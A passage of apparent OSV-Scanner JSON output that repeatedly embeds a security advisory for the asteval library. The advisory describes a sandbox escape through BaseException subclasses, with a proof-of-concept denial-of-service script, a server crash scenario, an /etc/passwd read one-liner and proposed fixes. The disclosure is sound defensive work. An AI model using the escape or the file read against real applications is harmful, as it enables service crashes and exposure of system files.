Remove dangerous classes from `FROM_PY` (minimal, preferred):**\n\n```python\n# asteval/astutils.py\n\nFROM_PY = ('ArithmeticError', 'AssertionError', 'AttributeError',\n           # Remove: 'BaseException',\n           'BufferError', 'BytesWarning',\n           'DeprecationWarning', 'EOFError', 'EnvironmentError',\n           'Exception', 'False', 'FloatingPointError',\n           # Remove: 'GeneratorExit',\n           'IOError', 'ImportError', 'ImportWarning', 'IndentationError',\n           'IndexError', 'KeyError',\n           # Remove: 'KeyboardInterrupt',\n           'LookupError',\n           'MemoryError', 'NameError', 'None',\n           'NotImplementedError', 'OSError', 'OverflowError',\n           'ReferenceError', 'RuntimeError', 'RuntimeWarning',\n           'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError',\n           # Remove: 'SystemExit',\n           'True', 'TypeError', ...)\n```\n\n**Option B — Block non-`Exception` raises in `on_raise()`:**\n\n```python\n# asteval/asteval.py\n\ndef on_raise(self, node):\n    excnode = node.exc\n    msgnode = node.cause\n    out = self.run(excnode)\n    # Prevent BaseException subclasses from escaping the sandbox\n    if not issubclass(out.__class__, Exception):\n        self.raise_exception(node, exc=RuntimeError,\n                             msg=f\"raising {out.__class__.__name__!r} is not permitted\")\n        return\n    msg = ' '.join(str(a) for a in out.args)\n    msg2 = self.run(msgnode)\n    if msg2 not in (None, 'None'):\n        msg = f\"{msg}: {msg2}\"\n    self.raise_exception(None, exc=out.__class__, msg=msg, expr='')\n```\n\nNote: Option B also fixes a secondary bug on the same line — `' '.join(out.args)` crashes\nwith `TypeError` when args contain non-strings (e.g., `raise SystemExit(0)` with integer\ncode). The fix uses `str(a) for a in out.args`.\n\n**Option C — Catch `BaseException` in `run()` and `eval()` (broadest, requires care):**\n\n```python\nexcept BaseException as exc:\n    if isinstance(exc, (SystemExit, KeyboardInterrupt, GeneratorExit)):\n        # Re-raise as RuntimeError to contain within sandbox\n        self.raise_exception(node, exc=RuntimeError,\n                             msg=f\"{type(exc).__name__} raised in sandbox\")\n    elif with_raise and self.expr is not None:\n        self.raise_exception(node, expr=self.expr)\n```\n\nOption A is the simplest and least likely to introduce regressions. Option B additionally\naddresses the `str.join` crash on integer args.\n\n---\n\n## Disclosure Timeline\n\n| Date | Event |\n|------|-------|\n| 2026-06-09 | Vulnerability discovered during code review |\n| 2026-06-09 | Report submitted via GitHub Security Advisory |\n| TBD | Maintainer acknowledgment |\n| TBD + 90 days | Public disclosure deadline |\n\n---\n\n## Researcher\n\nIndependent security researcher. No bug bounty program exists for this project.\nCVE assignment requested via GitHub Security Advisory submission.\n\n---\n\n## References\n\n- Prior CVE: CVE-2025-24359 (format string injection, fixed 1.0.6)\n- Prior advisory: GHSA-vp47-9734-prjw (AST mutation TOCTOU, fixed 1.0.6)\n- Python exception hierarchy: https://docs.python.org/3/library/exceptions.html#exception-hierarchy\n- `asteval` documentation: https://lmfit.github.io/asteval/",
+                "text": "## Summary\n\nAn attacker who can supply expressions to `asteval.Interpreter.eval()` can raise `SystemExit`,\n`KeyboardInterrupt`, `GeneratorExit`, or `BaseException` from inside the sandbox. These\nexceptions are subclasses of `BaseException` but not `Exception`, so they bypass the\n`except Exception:` safety net in both `run()` and `eval()`. The exception propagates\nverbatim to the calling application, terminating the process or disrupting signal and\ncleanup handlers.\n\nThis is distinct from prior vulnerabilities CVE-2025-24359 (format string injection) and\nGHSA-vp47-9734-prjw (AST mutation TOCTOU), both fixed in 1.0.6. This vector is present in\nall versions including 1.0.6 and current HEAD.\n\n---\n\n## Affected Code\n\n**`asteval/astutils.py`, lines 89–108** — `FROM_PY` exposes dangerous classes to sandbox users:\n\n```python\nFROM_PY = ('ArithmeticError', 'AssertionError', 'AttributeError',\n           'BaseException',          # ← escapes except Exception:\n           'BufferError', 'BytesWarning',\n           ...\n           'GeneratorExit',          # ← escapes except Exception:\n           ...\n           'KeyboardInterrupt',      # ← escapes except Exception:\n           ...\n           'SystemExit',             # ← escapes except Exception:\n           ...)\n```\n\n**`asteval/asteval.py`, line 322** — `run()` exception handler:\n\n```python\nexcept Exception:                    # ← does NOT catch BaseException subclasses\n    if with_raise and self.expr is not None:\n        self.raise_exception(node, expr=self.expr)\n```\n\n**`asteval/asteval.py`, line 370** — `eval()` exception handler:\n\n```python\nexcept Exception:                    # ← same gap\n    if show_errors and not raise_errors:\n        ...\n```\n\n**`asteval/asteval.py`, line 264** — `raise_exception()` raises the class directly:\n\n```python\nraise exc(self.error_msg)            # ← when exc=SystemExit, escapes both handlers above\n```\n\n---\n\n## Root Cause\n\nPython's exception hierarchy has two distinct branches under `BaseException`:\n\n```\nBaseException\n├── SystemExit          ← NOT caught by except Exception:\n├── KeyboardInterrupt   ← NOT caught by except Exception:\n├── GeneratorExit       ← NOT caught by except Exception:\n└── Exception           ← caught normally\n    ├── RuntimeError\n    ├── ValueError\n    └── ...\n```\n\n`FROM_PY` exposes all four non-`Exception` classes to sandbox users. When a user writes\n`raise SystemExit(\"msg\")`, the `on_raise()` handler calls:\n\n```python\nself.raise_exception(None, exc=out.__class__, msg=msg, expr='')\n```\n\nwhich executes `raise SystemExit(msg)`. This propagates through both `except Exception:`\nguards unchecked and surfaces in the calling application.\n\n---\n\n## Proof of Concept\n\n```python\nfrom asteval import Interpreter\n\n# Variant 1: terminate the process\naeval = Interpreter()\ntry:\n    aeval.eval('raise SystemExit(\"terminated by sandbox user\")')\nexcept SystemExit as e:\n    print(f\"[CONFIRMED] SystemExit escaped: {e.code!r}\")\n\n# Variant 2: disrupt signal/finally handling\naeval = Interpreter()\ntry:\n    aeval.eval('raise KeyboardInterrupt(\"interrupt injected\")')\nexcept KeyboardInterrupt as e:\n    print(f\"[CONFIRMED] KeyboardInterrupt escaped: {str(e)!r}\")\n\n# Variant 3: GeneratorExit\naeval = Interpreter()\ntry:\n    aeval.eval('raise GeneratorExit(\"gen escape\")')\nexcept GeneratorExit as e:\n    print(f\"[CONFIRMED] GeneratorExit escaped: {str(e)!r}\")\n\n# Variant 4: BaseException base class\naeval = Interpreter()\ntry:\n    aeval.eval('raise BaseException(\"base escape\")')\nexcept BaseException as e:\n    if not isinstance(e, Exception):\n        print(f\"[CONFIRMED] BaseException escaped: {str(e)!r}\")\n```\n\n**Output (tested on asteval 1.0.6, Python 3.11/3.12):**\n\n```\n[CONFIRMED] SystemExit escaped: 'terminated by sandbox user'\n[CONFIRMED] KeyboardInterrupt escaped: 'interrupt injected'\n[CONFIRMED] GeneratorExit escaped: 'gen escape'\n[CONFIRMED] BaseException escaped: 'base escape'\n```\n\n### Real-world server scenario\n\n```python\nfrom asteval import Interpreter\n\ndef handle_request(user_expression):\n    aeval = Interpreter()\n    return aeval.eval(user_expression)   # SystemExit propagates here\n\n# Attacker sends: raise SystemExit(1)\n# Application terminates. Top-level except Exception: handlers do not protect it.\ntry:\n    handle_request('raise SystemExit(1)')\nexcept Exception:\n    pass  # \u003c-- does NOT catch SystemExit; process exits\n```\n\n---\n\n## Impact\n\n| Variant | Impact |\n|---------|--------|\n| `SystemExit` | Process terminates; exit code and message attacker-controlled |\n| `KeyboardInterrupt` | Disrupts `finally` blocks, signal handlers, and `KeyboardInterrupt`-aware loops |\n| `GeneratorExit` | Disrupts generator cleanup in calling code |\n| `BaseException` | Generic escape, same propagation |\n\nAny application that:\n- Accepts user-supplied expressions via `asteval`\n- Relies on `except Exception:` at the top level (standard practice)\n- Does not wrap `aeval.eval()` in `except BaseException:` (non-standard, unexpected requirement)\n\n...is vulnerable to attacker-triggered process termination (DoS).\n\nCVSS breakdown: Network-reachable (AV:N), no special conditions (AC:L), no credentials (PR:N),\nno interaction (UI:N), scope unchanged (S:U), no confidentiality/integrity impact (C:N/I:N),\nhigh availability impact — process termination (A:H).\n\n---\n\n## Additional Note: File Read Capability (Acknowledged Limitation)\n\nIndependently of this vulnerability, `asteval` exposes a read-only `open()` wrapper\n(`_open` in `astutils.py`) that allows reading arbitrary files with the permissions of the\ncalling process:\n\n```python\naeval.eval(\"open('/etc/passwd').read()\")   # returns /etc/passwd contents\n```\n\nThis is documented in `doc/motivation.rst` as a known design choice (\"If reading from disk\nmust be forbidden, you will want to overwrite the `open()` function from the symbol table\").\nIt is included here for completeness, not as a separate advisory claim.\n\n---\n\n## Recommended Fix\n\n**Option A — Remove dangerous classes from `FROM_PY` (minimal, preferred):**\n\n```python\n# asteval/astutils.py\n\nFROM_PY = ('ArithmeticError', 'AssertionError', 'AttributeError',\n           # Remove: 'BaseException',\n           'BufferError', 'BytesWarning',\n           'DeprecationWarning', 'EOFError', 'EnvironmentError',\n           'Exception', 'False', 'FloatingPointError',\n           # Remove: 'GeneratorExit',\n           'IOError', 'ImportError', 'ImportWarning', 'IndentationError',\n           'IndexError', 'KeyError',\n           # Remove: 'KeyboardInterrupt',\n           'LookupError',\n           'MemoryError', 'NameError', 'None',\n           'NotImplementedError', 'OSError', 'OverflowError',\n           'ReferenceError', 'RuntimeError', 'RuntimeWarning',\n           'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError',\n           # Remove: 'SystemExit',\n           'True', 'TypeError', ...)\n```\n\n**Option B — Block non-`Exception` raises in `on_raise()`:**\n\n```python\n# asteval/asteval.py\n\ndef on_raise(self, node):\n    excnode = node.exc\n    msgnode = node.cause\n    out = self.run(excnode)\n    # Prevent BaseException subclasses from escaping the sandbox\n    if not issubclass(out.__class__, Exception):\n        self.raise_exception(node, exc=RuntimeError,\n                             msg=f\"raising {out.__class__.__name__!r} is not permitted\")\n        return\n    msg = ' '.join(str(a) for a in out.args)\n    msg2 = self.run(msgnode)\n    if msg2 not in (None, 'None'):\n        msg = f\"{msg}: {msg2}\"\n    self.raise_exception(None, exc=out.__class__, msg=msg, expr='')\n```\n\nNote: Option B also fixes a secondary bug on the same line — `' '.join(out.args)` crashes\nwith `TypeError` when args contain non-strings (e.g., `raise SystemExit(0)` with integer\ncode). The fix uses `str(a) for a in out.args`.\n\n**Option C — Catch `BaseException` in `run()` and `eval()` (broadest, requires care):**\n\n```python\nexcept BaseException as exc:\n    if isinstance(exc, (SystemExit, KeyboardInterrupt, GeneratorExit)):\n        # Re-raise as RuntimeError to contain within sandbox\n        self.raise_exception(node, exc=RuntimeError,\n                             msg=f\"{type(exc).__name__} raised in sandbox\")\n    elif with_raise and self.expr is not None:\n        self.raise_exception(node, expr=self.expr)\n```\n\nOption A is the simplest and least likely to introduce regressions. Option B additionally\naddresses the `str.join` crash on integer args.\n\n---\n\n## Disclosure Timeline\n\n| Date | Event |\n|------|-------|\n| 2026-06-09 | Vulnerability discovered during code review |\n| 2026-06-09 | Report submitted via GitHub Security Advisory |\n| TBD | Maintainer acknowledgment |\n| TBD + 90 days | Public disclosure deadline |\n\n---\n\n## Researcher\n\nIndependent security researcher. No bug bounty program exists for this project.\nCVE assignment requested via GitHub Security Advisory submission.\n\n---\n\n## References\n\n- Prior CVE: CVE-2025-24359 (format string injection, fixed 1.0.6)\n- Prior advisory: GHSA-vp47-9734-prjw (AST mutation TOCTOU, fixed 1.0.6)\n- Python exception hierarchy: https://docs.python.org/3/library/exceptions.html#exception-hierarchy\n- `asteval` documentation: https://lmfit.github.io/asteval/"
+              },
+              "help": {
+                "markdown": "**Your dependency is vulnerable to [CVE-2026-55244](https://osv.dev/CVE-2026-55244)**.\n\n## [GHSA-89v8-rhwq-hf77](https://osv.dev/GHSA-89v8-rhwq-hf77)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e An attacker who can supply expressions to `asteval.Interpreter.eval()` can raise `SystemExit`,\n\u003e `KeyboardInterrupt`, `GeneratorExit`, or `BaseException` from inside the sandbox. These\n\u003e exceptions are subclasses of `BaseException` but not `Exception`, so they bypass the\n\u003e `except Exception:` safety net in both `run()` and `eval()`. The exception propagates\n\u003e verbatim to the calling application, terminating the process or disrupting signal and\n\u003e cleanup handlers.\n\u003e \n\u003e This is distinct from prior vulnerabilities CVE-2025-24359 (format string injection) and\n\u003e GHSA-vp47-9734-prjw (AST mutation TOCTOU), both fixed in 1.0.6. This vector is present in\n\u003e all versions including 1.0.6 and current HEAD.\n\u003e \n\u003e ---\n\u003e \n\u003e ## Affected Code\n\u003e \n\u003e **`asteval/astutils.py`, lines 89–108** — `FROM_PY` exposes dangerous classes to sandbox users:\n\u003e \n\u003e ```python\n\u003e FROM_PY = ('ArithmeticError', 'AssertionError', 'AttributeError',\n\u003e            'BaseException',          # ← escapes except Exception:\n\u003e            'BufferError', 'BytesWarning',\n\u003e            ...\n\u003e            'GeneratorExit',          # ← escapes except Exception:\n\u003e            ...\n\u003e            'KeyboardInterrupt',      # ← escapes except Exception:\n\u003e            ...\n\u003e            'SystemExit',             # ← escapes except Exception:\n\u003e            ...)\n\u003e ```\n\u003e \n\u003e **`asteval/asteval.py`, line 322** — `run()` exception handler:\n\u003e \n\u003e ```python\n\u003e except Exception:                    # ← does NOT catch BaseException subclasses\n\u003e     if with_raise and self.expr is not None:\n\u003e         self.raise_exception(node, expr=self.expr)\n\u003e ```\n\u003e \n\u003e **`asteval/asteval.py`, line 370** — `eval()` exception handler:\n\u003e \n\u003e ```python\n\u003e except Exception:                    # ← same gap\n\u003e     if show_errors and not raise_errors:\n\u003e         ...\n\u003e ```\n\u003e \n\u003e **`asteval/asteval.py`, line 264** — `raise_exception()` raises the class directly:\n\u003e \n\u003e ```python\n\u003e raise exc(self.error_msg)            # ← when exc=SystemExit, escapes both handlers above\n\u003e ```\n\u003e \n\u003e ---\n\u003e \n\u003e ## Root Cause\n\u003e \n\u003e Python's exception hierarchy has two distinct branches under `BaseException`:\n\u003e \n\u003e ```\n\u003e BaseException\n\u003e ├── SystemExit          ← NOT caught by except Exception:\n\u003e ├── KeyboardInterrupt   ← NOT caught by except Exception:\n\u003e ├── GeneratorExit       ← NOT caught by except Exception:\n\u003e └── Exception           ← caught normally\n\u003e     ├── RuntimeError\n\u003e     ├── ValueError\n\u003e     └── ...\n\u003e ```\n\u003e \n\u003e `FROM_PY` exposes all four non-`Exception` classes to sandbox users. When a user writes\n\u003e `raise SystemExit(\"msg\")`, the `on_raise()` handler calls:\n\u003e \n\u003e ```python\n\u003e self.raise_exception(None, exc=out.__class__, msg=msg, expr='')\n\u003e ```\n\u003e \n\u003e which executes `raise SystemExit(msg)`. This propagates through both `except Exception:`\n\u003e guards unchecked and surfaces in the calling application.\n\u003e \n\u003e ---\n\u003e \n\u003e ## Proof of Concept\n\u003e \n\u003e ```python\n\u003e from asteval import Interpreter\n\u003e \n\u003e # Variant 1: terminate the process\n\u003e aeval = Interpreter()\n\u003e try:\n\u003e     aeval.eval('raise SystemExit(\"terminated by sandbox user\")')\n\u003e except SystemExit as e:\n\u003e     print(f\"[CONFIRMED] SystemExit escaped: {e.code!r}\")\n\u003e \n\u003e # Variant 2: disrupt signal/finally handling\n\u003e aeval = Interpreter()\n\u003e try:\n\u003e     aeval.eval('raise KeyboardInterrupt(\"interrupt injected\")')\n\u003e except KeyboardInterrupt as e:\n\u003e     print(f\"[CONFIRMED] KeyboardInterrupt escaped: {str(e)!r}\")\n\u003e \n\u003e # Variant 3: GeneratorExit\n\u003e aeval = Interpreter()\n\u003e try:\n\u003e     aeval.eval('raise GeneratorExit(\"gen escape\")')\n\u003e except GeneratorExit as e:\n\u003e     print(f\"[CONFIRMED] GeneratorExit escaped: {str(e)!r}\")\n\u003e \n\u003e # Variant 4: BaseException base class\n\u003e aeval = Interpreter()\n\u003e try:\n\u003e     aeval.eval('raise BaseException(\"base escape\")')\n\u003e except BaseException as e:\n\u003e     if not isinstance(e, Exception):\n\u003e         print(f\"[CONFIRMED] BaseException escaped: {str(e)!r}\")\n\u003e ```\n\u003e \n\u003e **Output (tested on asteval 1.0.6, Python 3.11/3.12):**\n\u003e \n\u003e ```\n\u003e [CONFIRMED] SystemExit escaped: 'terminated by sandbox user'\n\u003e [CONFIRMED] KeyboardInterrupt escaped: 'interrupt injected'\n\u003e [CONFIRMED] GeneratorExit escaped: 'gen escape'\n\u003e [CONFIRMED] BaseException escaped: 'base escape'\n\u003e ```\n\u003e \n\u003e ### Real-world server scenario\n\u003e \n\u003e ```python\n\u003e from asteval import Interpreter\n\u003e \n\u003e def handle_request(user_expression):\n\u003e     aeval = Interpreter()\n\u003e     return aeval.eval(user_expression)   # SystemExit propagates here\n\u003e \n\u003e # Attacker sends: raise SystemExit(1)\n\u003e # Application terminates. Top-level except Exception: handlers do not protect it.\n\u003e try:\n\u003e     handle_request('raise SystemExit(1)')\n\u003e except Exception:\n\u003e     pass  # \u003c-- does NOT catch SystemExit; process exits\n\u003e ```\n\u003e \n\u003e ---\n\u003e \n\u003e ## Impact\n\u003e \n\u003e | Variant | Impact |\n\u003e |---------|--------|\n\u003e | `SystemExit` | Process terminates; exit code and message attacker-controlled |\n\u003e | `KeyboardInterrupt` | Disrupts `finally` blocks, signal handlers, and `KeyboardInterrupt`-aware loops |\n\u003e | `GeneratorExit` | Disrupts generator cleanup in calling code |\n\u003e | `BaseException` | Generic escape, same propagation |\n\u003e \n\u003e Any application that:\n\u003e - Accepts user-supplied expressions via `asteval`\n\u003e - Relies on `except Exception:` at the top level (standard practice)\n\u003e - Does not wrap `aeval.eval()` in `except BaseException:` (non-standard, unexpected requirement)\n\u003e \n\u003e ...is vulnerable to attacker-triggered process termination (DoS).\n\u003e \n\u003e CVSS breakdown: Network-reachable (AV:N), no special conditions (AC:L), no credentials (PR:N),\n\u003e no interaction (UI:N), scope unchanged (S:U), no confidentiality/integrity impact (C:N/I:N),\n\u003e high availability impact — process termination (A:H).\n\u003e \n\u003e ---\n\u003e \n\u003e ## Additional Note: File Read Capability (Acknowledged Limitation)\n\u003e \n\u003e Independently of this vulnerability, `asteval` exposes a read-only `open()` wrapper\n\u003e (`_open` in `astutils.py`) that allows reading arbitrary files with the permissions of the\n\u003e calling process:\n\u003e \n\u003e ```python\n\u003e aeval.eval(\"open('/etc/passwd').read()\")   # returns /etc/passwd contents\n\u003e ```\n\u003e \n\u003e This is documented in `doc/motivation.rst` as a known design choice (\"If reading from disk\n\u003e must be forbidden, you will want to overwrite the `open()` function from the symbol table\").\n\u003e It is included here for completeness, not as a separate advisory claim.\n\u003e \n\u003e ---\n\u003e \n\u003e ## Recommended Fix\n\u003e \n\u003e **Option A — Remove dangerous classes from `FROM_PY` (minimal, preferred):**\n\u003e \n\u003e ```python\n\u003e # asteval/astutils.py\n\u003e \n\u003e FROM_PY = ('ArithmeticError', 'AssertionError', 'AttributeError',\n\u003e            # Remove: 'BaseException',\n\u003e            'BufferError', 'BytesWarning',\n\u003e            'DeprecationWarning', 'EOFError', 'EnvironmentError',\n\u003e            'Exception', 'False', 'FloatingPointError',\n\u003e            # Remove: 'GeneratorExit',\n\u003e            'IOError', 'ImportError', 'ImportWarning', 'IndentationError',\n\u003e            'IndexError', 'KeyError',\n\u003e            # Remove: 'KeyboardInterrupt',\n\u003e            'LookupError',\n\u003e            'MemoryError', 'NameError', 'None',\n\u003e            'NotImplementedError', 'OSError', 'OverflowError',\n\u003e            'ReferenceError', 'RuntimeError', 'RuntimeWarning',\n\u003e            'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError',\n\u003e            # Remove: 'SystemExit',\n\u003e            'True', 'TypeError', ...)\n\u003e ```\n\u003e \n\u003e **Option B — Block non-`Exception` raises in `on_raise()`:**\n\u003e \n\u003e ```python\n\u003e # asteval/asteval.py\n\u003e \n\u003e def on_raise(self, node):\n\u003e     excnode = node.exc\n\u003e     msgnode = node.cause\n\u003e     out = self.run(excnode)\n\u003e     # Prevent BaseException subclasses from escaping the sandbox\n\u003e     if not issubclass(out.__class__, Exception):\n\u003e         self.raise_exception(node, exc=RuntimeError,\n\u003e                              msg=f\"raising {out.__class__.__name__!r} is not permitted\")\n\u003e         return\n\u003e     msg = ' '.join(str(a) for a in out.args)\n\u003e     msg2 = self.run(msgnode)\n\u003e     if msg2 not in (None, 'None'):\n\u003e         msg = f\"{msg}: {msg2}\"\n\u003e     self.raise_exception(None, exc=out.__class__, msg=msg, expr='')\n\u003e ```\n\u003e \n\u003e Note: Option B also fixes a secondary bug on the same line — `' '.join(out.args)` crashes\n\u003e with `TypeError` when args contain non-strings (e.g., `raise SystemExit(0)` with integer\n\u003e code). The fix uses `str(a) for a in out.args`.\n\u003e \n\u003e **Option C — Catch `BaseException` in `run()` and `eval()` (broadest, requires care):**\n\u003e \n\u003e ```python\n\u003e except BaseException as exc:\n\u003e     if isinstance(exc, (SystemExit, KeyboardInterrupt, GeneratorExit)):\n\u003e         # Re-raise as RuntimeError to contain within sandbox\n\u003e         self.raise_exception(node, exc=RuntimeError,\n\u003e                              msg=f\"{type(exc).__name__} raised in sandbox\")\n\u003e     elif with_raise and self.expr is not None:\n\u003e         self.raise_exception(node, expr=self.expr)\n\u003e ```\n\u003e \n\u003e Option A is the simplest and least likely to introduce regressions. Option B additionally\n\u003e addresses the `str.join` crash on integer args.\n\u003e \n\u003e ---\n\u003e \n\u003e ## Disclosure Timeline\n\u003e \n\u003e | Date | Event |\n\u003e |------|-------|\n\u003e | 2026-06-09 | Vulnerability discovered during code review |\n\u003e | 2026-06-09 | Report submitted via GitHub Security Advisory |\n\u003e | TBD | Maintainer acknowledgment |\n\u003e | TBD + 90 days | Public disclosure deadline |\n\u003e \n\u003e ---\n\u003e \n\u003e ## Researcher\n\u003e \n\u003e Independent security researcher. No bug bounty program exists for this project.\n\u003e CVE assignment requested via GitHub Security Advisory submission.\n\u003e \n\u003e ---\n\u003e \n\u003e ## References\n\u003e \n\u003e - Prior CVE: CVE-2025-24359 (format string injection, fixed 1.0.6)\n\u003e - Prior advisory: GHSA-vp47-9734-prjw (AST mutation TOCTOU, fixed 1.0.6)\n\u003e - Python exception hierarchy: https://docs.python.org/3/library/exceptions.html#exception-hierarchy\n\u003e - `asteval` documentation: https://lmfit.github.io/asteval/\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | asteval | 1.0.6 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-89v8-rhwq-hf77 | asteval | 1.0.9 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-55244\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
+                "text": "**Your dependency is vulnerable to [CVE-2026-55244](https://osv.dev/CVE-2026-55244)**.\n\n## [GHSA-89v8-rhwq-hf77](https://osv.dev/GHSA-89v8-rhwq-hf77)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e An attacker who can supply expressions to `asteval.Interpreter.eval()` can raise `SystemExit`,\n\u003e `KeyboardInterrupt`, `GeneratorExit`, or `BaseException` from inside the sandbox. These\n\u003e exceptions are subclasses of `BaseException` but not `Exception`, so they bypass the\n\u003e `except Exception:` safety net in both `run()` and `eval()`. The exception propagates\n\u003e verbatim to the calling application, terminating the process or disrupting signal and\n\u003e cleanup handlers.\n\u003e \n\u003e This is distinct from prior vulnerabilities CVE-2025-24359 (format string injection) and\n\u003e GHSA-vp47-9734-prjw (AST mutation TOCTOU), both fixed in 1.0.6. This vector is present in\n\u003e all versions including 1.0.6 and current HEAD.\n\u003e \n\u003e ---\n\u003e \n\u003e ## Affected Code\n\u003e \n\u003e **`asteval/astutils.py`, lines 89–108** — `FROM_PY` exposes dangerous classes to sandbox users:\n\u003e \n\u003e ```python\n\u003e FROM_PY = ('ArithmeticError', 'AssertionError', 'AttributeError',\n\u003e            'BaseException',          # ← escapes except Exception:\n\u003e            'BufferError', 'BytesWarning',\n\u003e            ...\n\u003e            'GeneratorExit',          # ← escapes except Exception:\n\u003e            ...\n\u003e            'KeyboardInterrupt',      # ← escapes except Exception:\n\u003e            ...\n\u003e            'SystemExit',             # ← escapes except Exception:\n\u003e            ...)\n\u003e ```\n\u003e \n\u003e **`asteval/asteval.py`, line 322** — `run()` exception handler:\n\u003e \n\u003e ```python\n\u003e except Exception:                    # ← does NOT catch BaseException subclasses\n\u003e     if with_raise and self.expr is not None:\n\u003e         self.raise_exception(node, expr=self.expr)\n\u003e ```\n\u003e \n\u003e **`asteval/asteval.py`, line 370** — `eval()` exception handler:\n\u003e \n\u003e ```python\n\u003e except Exception:                    # ← same gap\n\u003e     if show_errors and not raise_errors:\n\u003e         ...\n\u003e ```\n\u003e \n\u003e **`asteval/asteval.py`, line 264** — `raise_exception()` raises the class directly:\n\u003e \n\u003e ```python\n\u003e raise exc(self.error_msg)            # ← when exc=SystemExit, escapes both handlers above\n\u003e ```\n\u003e \n\u003e ---\n\u003e \n\u003e ## Root Cause\n\u003e \n\u003e Python's exception hierarchy has two distinct branches under `BaseException`:\n\u003e \n\u003e ```\n\u003e BaseException\n\u003e ├── SystemExit          ← NOT caught by except Exception:\n\u003e ├── KeyboardInterrupt   ← NOT caught by except Exception:\n\u003e ├── GeneratorExit       ← NOT caught by except Exception:\n\u003e └── Exception           ← caught normally\n\u003e     ├── RuntimeError\n\u003e     ├── ValueError\n\u003e     └── ...\n\u003e ```\n\u003e \n\u003e `FROM_PY` exposes all four non-`Exception` classes to sandbox users. When a user writes\n\u003e `raise SystemExit(\"msg\")`, the `on_raise()` handler calls:\n\u003e \n\u003e ```python\n\u003e self.raise_exception(None, exc=out.__class__, msg=msg, expr='')\n\u003e ```\n\u003e \n\u003e which executes `raise SystemExit(msg)`. This propagates through both `except Exception:`\n\u003e guards unchecked and surfaces in the calling application.\n\u003e \n\u003e ---\n\u003e \n\u003e ## Proof of Concept\n\u003e \n\u003e ```python\n\u003e from asteval import Interpreter\n\u003e \n\u003e # Variant 1: terminate the process\n\u003e aeval = Interpreter()\n\u003e try:\n\u003e     aeval.eval('raise SystemExit(\"terminated by sandbox user\")')\n\u003e except SystemExit as e:\n\u003e     print(f\"[CONFIRMED] SystemExit escaped: {e.code!r}\")\n\u003e \n\u003e # Variant 2: disrupt signal/finally handling\n\u003e aeval = Interpreter()\n\u003e try:\n\u003e     aeval.eval('raise KeyboardInterrupt(\"interrupt injected\")')\n\u003e except KeyboardInterrupt as e:\n\u003e     print(f\"[CONFIRMED] KeyboardInterrupt escaped: {str(e)!r}\")\n\u003e \n\u003e # Variant 3: GeneratorExit\n\u003e aeval = Interpreter()\n\u003e try:\n\u003e     aeval.eval('raise GeneratorExit(\"gen escape\")')\n\u003e except GeneratorExit as e:\n\u003e     print(f\"[CONFIRMED] GeneratorExit escaped: {str(e)!r}\")\n\u003e \n\u003e # Variant 4: BaseException base class\n\u003e aeval = Interpreter()\n\u003e try:\n\u003e     aeval.eval('raise BaseException(\"base escape\")')\n\u003e except BaseException as e:\n\u003e     if not isinstance(e, Exception):\n\u003e         print(f\"[CONFIRMED] BaseException escaped: {str(e)!r}\")\n\u003e ```\n\u003e \n\u003e **Output (tested on asteval 1.0.6, Python 3.11/3.12):**\n\u003e \n\u003e ```\n\u003e [CONFIRMED] SystemExit escaped: 'terminated by sandbox user'\n\u003e [CONFIRMED] KeyboardInterrupt escaped: 'interrupt injected'\n\u003e [CONFIRMED] GeneratorExit escaped: 'gen escape'\n\u003e [CONFIRMED] BaseException escaped: 'base escape'\n\u003e ```\n\u003e \n\u003e ### Real-world server scenario\n\u003e \n\u003e ```python\n\u003e from asteval import Interpreter\n\u003e \n\u003e def handle_request(user_expression):\n\u003e     aeval = Interpreter()\n\u003e     return aeval.eval(user_expression)   # SystemExit propagates here\n\u003e \n\u003e # Attacker sends: raise SystemExit(1)\n\u003e # Application terminates. Top-level except Exception: handlers do not protect it.\n\u003e try:\n\u003e     handle_request('raise SystemExit(1)')\n\u003e except Exception:\n\u003e     pass  # \u003c-- does NOT catch SystemExit; process exits\n\u003e ```\n\u003e \n\u003e ---\n\u003e \n\u003e ## Impact\n\u003e \n\u003e | Variant | Impact |\n\u003e |---------|--------|\n\u003e | `SystemExit` | Process terminates; exit code and message attacker-controlled |\n\u003e | `KeyboardInterrupt` | Disrupts `finally` blocks, signal handlers, and `KeyboardInterrupt`-aware loops |\n\u003e | `GeneratorExit` | Disrupts generator cleanup in calling code |\n\u003e | `BaseException` | Generic escape, same propagation |\n\u003e \n\u003e Any application that:\n\u003e - Accepts user-supplied expressions via `asteval`\n\u003e - Relies on `except Exception:` at the top level (standard practice)\n\u003e - Does not wrap `aeval.eval()` in `except BaseException:` (non-standard, unexpected requirement)\n\u003e \n\u003e ...is vulnerable to attacker-triggered process termination (DoS).\n\u003e \n\u003e CVSS breakdown: Network-reachable (AV:N), no special conditions (AC:L), no credentials (PR:N),\n\u003e no interaction (UI:N), scope unchanged (S:U), no confidentiality/integrity impact (C:N/I:N),\n\u003e high availability impact — process termination (A:H).\n\u003e \n\u003e ---\n\u003e \n\u003e ## Additional Note: File Read Capability (Acknowledged Limitation)\n\u003e \n\u003e Independently of this vulnerability, `asteval` exposes a read-only `open()` wrapper\n\u003e (`_open` in `astutils.py`) that allows reading arbitrary files with the permissions of the\n\u003e calling process:\n\u003e \n\u003e ```python\n\u003e aeval.eval(\"open('/etc/passwd').read()\")   # returns /etc/passwd contents\n\u003e ```\n\u003e \n\u003e This is documented in `doc/motivation.rst` as a 